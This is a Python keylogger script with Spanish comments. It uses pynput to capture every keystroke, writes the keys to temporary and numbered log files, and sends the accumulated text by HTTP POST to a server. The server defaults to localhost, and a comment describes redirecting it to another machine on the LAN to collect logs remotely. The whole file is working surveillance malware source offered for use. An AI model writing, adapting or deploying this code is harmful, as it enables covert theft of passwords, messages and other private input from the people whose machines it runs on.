# keylogger.py
# Requiere: pynput, requests
import os
import threading
import time
from pynput.keyboard import Key, Listener
import requests

# URL del servidor en la red local, podemos cambiar de localhost a "http://<ipserver>:8080/log"
# para que reciba los logs desde otra máquina en la misma LAN.
SERVER_URL = "http://localhost:8080/log"

# Nombre del archivo temporal que se va actualizando durante la sesion
TEMP_LOG = "temp_log.txt"

# Lista donde se acumulan las teclas en memoria
keys = []

# Si quieres enviar cada tal num de teclas en lugar de una, cambias el BATCH_SIZE
BATCH_SIZE = 1  # 1 = enviar cada tecla; >=2 enviará cada N teclas

# ---------------- utilidades
def get_next_log_filename(prefix="log", ext=".txt"):
    """
    Busca el siguiente filename disponible: log1.txt, log2.txt, ...
    """
    counter = 1
    while True:
        name = f"{prefix}{counter}{ext}"
        if not os.path.exists(name):
            return name
        counter += 1

def safe_write_temp(contents):
    """
    Escribe el archivo temporal (sobrescribe).
    """
    try:
        with open(TEMP_LOG, "w", encoding="utf-8") as f:
            f.write(contents)
    except Exception as e:
        print(f"[ERROR] al escribir temp log: {e}")

def send_to_server(data):
    """
    Envía data al servidor en un hilo para no bloquear el listener.
    Se pasa SERVER_URL como argumento al thread para evitar problemas de scope.
    """
    def _send(payload, url):
        try:
            # enviamos como body raw. Si quieres form-data usar data={'log': payload}
            r = requests.post(url, data=payload, timeout=3)
            if r.status_code == 200:
                # opcional: confirmar
                pass
            else:
                print(f"[WARN] servidor respondió {r.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[WARN] No se pudo conectar con el servidor: {e}")

    thread = threading.Thread(target=_send, args=(data, SERVER_URL), daemon=True)
    thread.start()

# ---------- manejo de teclas
def presionar_tecla(key):
    """
    Callback on_press: acumula la tecla, actualiza temp file y envía al server.
    """
    try:
        # Convertimos la tecla a una representación legible
        k = str(key).replace("'", "")
        keys.append(k)

        # se actualiza el archivo temporal
        safe_write_temp("".join(keys))

        # Si alcanzamos batch, enviamos al servidor
        if BATCH_SIZE <= 1 or len(keys) % BATCH_SIZE == 0:
            # enviamos todo lo acumulado por simplicidad; puedes enviar solo lo nuevo si queres
            contents = "".join(keys)
            send_to_server(contents)
    except Exception as e:
        print(f"[ERROR en presionar_tecla]: {e}")

def soltar_tecla(key):
    """
    Callback on_release: si se presiona ESC, termina y guarda la sesión en logN.txt
    """
    if key == Key.esc:
        # Guardar sesión final en archivo numerado
        try:
            # Leemos el contenido temporal (si existe el temp) para asegurar consistencia
            contents = ""
            if os.path.exists(TEMP_LOG):
                with open(TEMP_LOG, "r", encoding="utf-8") as f:
                    contents = f.read()
            else:
                contents = "".join(keys)

            # Conseguir siguiente nombre disponible
            filename = get_next_log_filename(prefix="log", ext=".txt")
            with open(filename, "w", encoding="utf-8") as out:
                # Agregamos timestamp al inicio para identificar la sesipn
                out.write(f"Session saved: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                out.write(contents)

            print(f"[INFO] Sesión guardada en {filename}")

            # envia una ultima vez al servidor indicando fin de sesión
            send_to_server(f"[END_SESSION]\nSaved to {filename}\n{contents}")

        except Exception as e:
            print(f"[ERROR al guardar sesión]: {e}")
        # devolver false para detener el listener
        return False

# ------------ main 
if __name__ == "__main__":
    # borrar el temp anterior si existe
    try:
        if os.path.exists(TEMP_LOG):
            os.remove(TEMP_LOG)
    except Exception:
        pass

    print("Iniciando keylogger. Presioná ESC para terminar y guardar la sesión.")
    with Listener(on_press=presionar_tecla, on_release=soltar_tecla) as listener:
        listener.join()
